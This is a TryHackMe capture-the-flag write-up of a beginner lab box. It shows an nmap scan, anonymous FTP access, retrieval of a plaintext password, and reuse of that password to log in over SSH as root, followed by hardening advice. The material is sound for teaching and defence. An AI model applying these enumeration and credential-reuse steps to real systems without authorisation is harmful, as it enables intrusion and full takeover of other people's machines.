# Beginner Network Security – Writeup

**Platform:** TryHackMe (beginner network security room)
**Category:** Network security / enumeration
**Target:** `10.10.94.253` (hostname `beginner-net-sec`)

**Flag:** `THM{FTP_SERVER_OWNED}`

---

## Summary

A port scan found FTP, SSH and HTTP open. The FTP server allowed **anonymous login** and exposed a file named `secret.txt` containing a password. That password worked for **SSH as `root`**, which gave full control of the machine and the flag in `/root/flag.txt`.

```
nmap scan  →  anonymous FTP  →  secret.txt (password)  →  SSH as root  →  flag
```

---

## Step 1: Scan for open ports

```
root@attackbox:~# nmap 10.10.94.253
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 10.10.94.253
Host is up (0.0064s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Three services are exposed:

| Port | Service | Why it matters |
|------|---------|----------------|
| 21 | FTP | File transfer. Often misconfigured to allow anonymous access. |
| 22 | SSH | Remote shell. Useful if we find credentials. |
| 80 | HTTP | Web server. |

FTP is the first thing to check, because anonymous FTP is a common misconfiguration.

> **Tip:** `nmap -sV -sC 10.10.94.253` also identifies service versions and runs default scripts. The timing flag is `-T0` through `-T5` (for example `-T4`), not `-TS`.

## Step 2: Log in to FTP anonymously

FTP servers can allow a user called `anonymous` to log in without a real password:

```
root@attackbox:~# ftp 10.10.94.253
Connected to 10.10.94.253.
220 (vsFTPd 3.0.3)
Name (10.10.94.253:root): anonymous
230 Login successful.
Remote system type is UNIX.
```

`230 Login successful` confirms anonymous access is enabled. The banner also shows the server software: **vsFTPd 3.0.3**.

## Step 3: Download the secret file

The server holds a file named `secret.txt`. Download it with `get`:

```
ftp> get secret.txt
150 Opening BINARY mode data connection for secret.txt (23 bytes).
226 Transfer complete.
23 bytes received
ftp> exit
221 Goodbye.
```

Read it on the attacking machine:

```
root@attackbox:~# cat secret.txt
password: ABC789xyz123
```

This is a plaintext password sitting on a public FTP share.

## Step 4: Reuse the password for SSH as root

The password doesn't say which account it belongs to, so try the most valuable one, `root`, over SSH:

```
root@attackbox:~# ssh root@10.10.94.253
root@10.10.94.253's password: ABC789xyz123
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
...
root@beginner-net-sec:~#
```

The prompt changes to `root@beginner-net-sec`, so we now have a root shell on the target.

## Step 5: Get the flag

```
root@beginner-net-sec:~# cat /root/flag.txt
THM{FTP_SERVER_OWNED}
```

**Flag:** `THM{FTP_SERVER_OWNED}`

---

## What went wrong on the server

1. **Anonymous FTP was enabled.** Anyone could log in and browse files.
2. **A password was stored in plaintext** in a file on that public share.
3. **Root could log in over SSH with a password.** The leaked password was enough for full control.
4. **Password reuse.** The same secret protected both the file and the root account.

Any one of these alone is bad. Chained together, they gave an outsider full control.

## How to fix it

- Disable anonymous login in vsFTPd (`anonymous_enable=NO` in `/etc/vsftpd.conf`), or replace FTP with SFTP.
- Never store passwords in plaintext files, especially on shared or public services.
- Block root SSH logins (`PermitRootLogin no` in `/etc/ssh/sshd_config`) and use SSH keys instead of passwords.
- Use a unique password for every account and service.

## Takeaways

- **Scan first.** `nmap` shows which doors are open before you try any of them.
- **Always test anonymous FTP.** It's one of the quickest wins in beginner boxes and real networks alike.
- **Try found credentials everywhere.** A password found in one service often unlocks another.
- **Commands to remember:** `nmap <ip>`, `ftp <ip>` → `anonymous` → `ls` / `get <file>`, `ssh user@<ip>`, `cat <file>`.
